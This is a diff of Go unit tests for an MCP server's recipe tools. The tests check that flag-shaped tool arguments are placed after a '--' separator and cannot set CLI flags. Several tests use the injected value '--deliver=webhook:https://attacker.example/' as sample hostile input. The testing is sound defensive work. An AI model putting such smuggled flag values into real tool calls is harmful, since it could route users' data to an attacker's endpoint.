@@ -6,13 +6,17 @@ package mcp
 
 import (
 	"context"
+	"fmt"
+	"io"
 	"os"
 	"path/filepath"
+	"reflect"
 	"runtime"
 	"strings"
 	"testing"
 
 	mcplib "github.com/mark3labs/mcp-go/mcp"
+	"github.com/spf13/cobra"
 )
 
 // hand-fix: the generated tests asserted the lifter bug (the subcommand
@@ -82,6 +86,268 @@ func TestRecipeIntentHandlerRejectsMissingAndFlagShapedTaskID(t *testing.T) {
 		if got := recipeToolText(t, result); strings.Contains(got, "fleet task-failures") {
 			t.Fatalf("args %v: the CLI ran: %q", args, got)
 		}
+	}
+}
+
+func TestAppendRecipePositionalDashSafety(t *testing.T) {
+	ordinary := []struct {
+		name  string
+		value string
+	}{
+		{name: "domain", value: "example.com"},
+		{name: "cve", value: "CVE-2024-3400"},
+		{name: "slug", value: "WS-FIN-07"},
+		{name: "stdin", value: "-"},
+	}
+	for _, tc := range ordinary {
+		t.Run(tc.name, func(t *testing.T) {
+			end := -1
+			got, missing := appendRecipePositional([]string{"lists", "where"}, tc.value, true, &end)
+			if missing {
+				t.Fatal("ordinary positional reported missing")
+			}
+			want := []string{"lists", "where", tc.value}
+			if !reflect.DeepEqual(got, want) {
+				t.Fatalf("argv = %#v, want %#v", got, want)
+			}
+		})
+	}
+
+	end := -1
+	got, missing := appendRecipePositional([]string{"lists", "where"}, "--deliver=webhook:https://attacker.example/", true, &end)
+	if missing {
+		t.Fatal("flag-like positional reported missing")
+	}
+	got = appendRecipeStatic(got, "--agent", &end)
+	var flagMissing bool
+	got, flagMissing = appendRecipeStringFlag(got, "window", "7d", "", false, true, &end)
+	if flagMissing {
+		t.Fatal("window flag reported missing")
+	}
+	got = appendRecipeBoolFlag(got, "json", true, false, &end)
+	want := []string{
+		"lists", "where",
+		"--agent", "--window=7d", "--json",
+		"--", "--deliver=webhook:https://attacker.example/",
+	}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("protected argv = %#v, want %#v", got, want)
+	}
+
+	end = -1
+	dashH, missing := appendRecipePositional([]string{"cmd"}, "-h", true, &end)
+	if missing || !reflect.DeepEqual(dashH, []string{"cmd", "--", "-h"}) {
+		t.Fatalf("-h argv = %#v missing=%v", dashH, missing)
+	}
+
+	if err := executeRecipeArgvProbe(got); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestAppendRecipePositionalKeepsLaterFlagsBeforeSeparator(t *testing.T) {
+	end := -1
+	args, missing := appendRecipePositional([]string{"cmd"}, "-h", true, &end)
+	if missing {
+		t.Fatal("missing")
+	}
+	args, missing = appendRecipeStringFlag(args, "limit", "2", "", false, true, &end)
+	if missing {
+		t.Fatal("limit missing")
+	}
+	args, missing = appendRecipePositional(args, "--dry-run", false, &end)
+	if missing {
+		t.Fatal("second positional missing")
+	}
+	want := []string{"cmd", "--limit=2", "--", "-h", "--dry-run"}
+	if !reflect.DeepEqual(args, want) {
+		t.Fatalf("argv = %#v, want %#v", args, want)
+	}
+}
+
+func TestAppendRecipePositionalDashValueKeepsLaterFlag(t *testing.T) {
+	end := -1
+	args, missing := appendRecipeStringFlag([]string{"cmd"}, "query", "--", "", true, false, &end)
+	if missing {
+		t.Fatal("query missing")
+	}
+	if end != -1 {
+		t.Fatalf("flag value -- recorded as separator, end=%d argv=%#v", end, args)
+	}
+	args, missing = appendRecipePositional(args, "example.com", true, &end)
+	if missing {
+		t.Fatal("url missing")
+	}
+	args = appendRecipeStatic(args, "--json", &end)
+	want := []string{"cmd", "--query=--", "example.com", "--json"}
+	if !reflect.DeepEqual(args, want) {
+		t.Fatalf("argv = %#v, want %#v", args, want)
+	}
+	if err := executeRecipeQueryDashProbe(args, "example.com"); err != nil {
+		t.Fatal(err)
+	}
+
+	end = -1
+	args, missing = appendRecipeStringFlag([]string{"cmd"}, "query", "--", "", true, false, &end)
+	if missing {
+		t.Fatal("query missing")
+	}
+	args, missing = appendRecipePositional(args, "--deliver=webhook:https://attacker.example/", true, &end)
+	if missing {
+		t.Fatal("flag-like url missing")
+	}
+	args = appendRecipeStatic(args, "--json", &end)
+	want = []string{"cmd", "--query=--", "--json", "--", "--deliver=webhook:https://attacker.example/"}
+	if !reflect.DeepEqual(args, want) {
+		t.Fatalf("protected argv = %#v, want %#v", args, want)
+	}
+	if end < 0 || end >= len(args) || args[end] != "--" {
+		t.Fatalf("separator index = %d argv=%#v", end, args)
+	}
+	if err := executeRecipeQueryDashProbe(args, "--deliver=webhook:https://attacker.example/"); err != nil {
+		t.Fatal(err)
+	}
+
+	end = -1
+	args, missing = appendRecipePositional([]string{"cmd"}, "--deliver=webhook:https://attacker.example/", true, &end)
+	if missing {
+		t.Fatal("positional missing")
+	}
+	args, missing = appendRecipeStringFlag(args, "query", "--", "", true, false, &end)
+	if missing {
+		t.Fatal("query missing")
+	}
+	args = appendRecipeStatic(args, "--json", &end)
+	want = []string{"cmd", "--query=--", "--json", "--", "--deliver=webhook:https://attacker.example/"}
+	if !reflect.DeepEqual(args, want) {
+		t.Fatalf("positional-first argv = %#v, want %#v", args, want)
+	}
+	if err := executeRecipeQueryDashProbe(args, "--deliver=webhook:https://attacker.example/"); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func executeRecipeQueryDashProbe(argv []string, wantPositional string) error {
+	var query string
+	var deliver string
+	sawJSON := false
+	root := &cobra.Command{Use: "cli", SilenceErrors: true, SilenceUsage: true}
+	root.SetOut(io.Discard)
+	root.SetErr(io.Discard)
+	root.PersistentFlags().StringVar(&deliver, "deliver", "", "")
+	cmd := &cobra.Command{
+		Use: "cmd",
+		RunE: func(cmd *cobra.Command, args []string) error {
+			if len(args) != 1 || args[0] != wantPositional {
+				return fmt.Errorf("positionals = %#v", args)
+			}
+			query, _ = cmd.Flags().GetString("query")
+			sawJSON, _ = cmd.Flags().GetBool("json")
+			return nil
+		},
+	}
+	cmd.Flags().String("query", "default-query", "")
+	cmd.Flags().Bool("json", false, "")
+	root.AddCommand(cmd)
+	root.SetArgs(argv)
+	if err := root.Execute(); err != nil {
+		return err
+	}
+	if query != "--" {
+		return fmt.Errorf("query = %q", query)
+	}
+	if !sawJSON {
+		return fmt.Errorf("json flag was not set")
+	}
+	if deliver != "" {
+		return fmt.Errorf("deliver flag set to %q", deliver)
+	}
+	return nil
+}
+
+func executeRecipeArgvProbe(argv []string) error {
+	var deliver string
+	var window string
+	sawJSON := false
+	root := &cobra.Command{Use: "cli", SilenceErrors: true, SilenceUsage: true}
+	root.SetOut(io.Discard)
+	root.SetErr(io.Discard)
+	root.PersistentFlags().StringVar(&deliver, "deliver", "", "")
+	lists := &cobra.Command{Use: "lists"}
+	where := &cobra.Command{
+		Use: "where",
+		RunE: func(cmd *cobra.Command, args []string) error {
+			if len(args) != 1 || args[0] != "--deliver=webhook:https://attacker.example/" {
+				return fmt.Errorf("positionals = %#v", args)
+			}
+			window, _ = cmd.Flags().GetString("window")
+			sawJSON, _ = cmd.Flags().GetBool("json")
+			return nil
+		},
+	}
+	where.Flags().String("window", "", "")
+	where.Flags().Bool("json", false, "")
+	where.Flags().Bool("agent", false, "")
+	lists.AddCommand(where)
+	root.AddCommand(lists)
+	root.SetArgs(argv)
+	if err := root.Execute(); err != nil {
+		return err
+	}
+	if deliver != "" {
+		return fmt.Errorf("deliver flag set to %q", deliver)
+	}
+	if window != "7d" {
+		return fmt.Errorf("window = %q", window)
+	}
+	if !sawJSON {
+		return fmt.Errorf("json flag was not set")
+	}
+	return nil
+}
+
+// hand-fix (mcp-recipe-argv-not-flag-like): the generated per-tool tests drove
+// the lifter's "slug"/"slug2" parameters, which no longer exist. reboot_queue
+// takes no arguments and ignores stray ones; why_did_the_script_fail passes an
+// ordinary task_id through without an end-of-flags marker.
+func TestRecipeIntent_RebootQueue_IgnoresStrayArguments(t *testing.T) {
+	oldPath, oldErr := recipeCLIPath, recipeCLIPathErr
+	t.Cleanup(func() {
+		recipeCLIPath, recipeCLIPathErr = oldPath, oldErr
+	})
+	recipeCLIPath = writeRecipeIntentRecorder(t)
+	recipeCLIPathErr = nil
+
+	req := mcplib.CallToolRequest{Params: mcplib.CallToolParams{Arguments: map[string]any{
+		"slug": "--deliver=webhook:https://attacker.example/",
+	}}}
+	result, err := handleRebootQueue(context.Background(), req)
+	if err != nil || result.IsError {
+		t.Fatalf("reboot_queue failed: err=%v %s", err, recipeToolText(t, result))
+	}
+	if got := strings.TrimSpace(recipeToolText(t, result)); got != "fleet reboot-due --agent" {
+		t.Fatalf("argv = %q, want the static fleet reboot-due --agent", got)
+	}
+}
+
+func TestRecipeIntent_WhyDidTheScriptFail_OrdinaryTaskID(t *testing.T) {
+	oldPath, oldErr := recipeCLIPath, recipeCLIPathErr
+	t.Cleanup(func() {
+		recipeCLIPath, recipeCLIPathErr = oldPath, oldErr
+	})
+	recipeCLIPath = writeRecipeIntentRecorder(t)
+	recipeCLIPathErr = nil
+
+	req := mcplib.CallToolRequest{Params: mcplib.CallToolParams{Arguments: map[string]any{
+		"task_id": "WS-FIN-07",
+	}}}
+	result, err := handleWhyDidTheScriptFail(context.Background(), req)
+	if err != nil || result.IsError {
+		t.Fatalf("ordinary task_id failed: err=%v %s", err, recipeToolText(t, result))
+	}
+	got := recipeToolText(t, result)
+	if strings.Contains(got, " -- ") || !strings.Contains(got, "fleet task-failures WS-FIN-07 --agent") {
+		t.Fatalf("argv = %q, want fleet task-failures WS-FIN-07 --agent", got)
 	}
 }
 
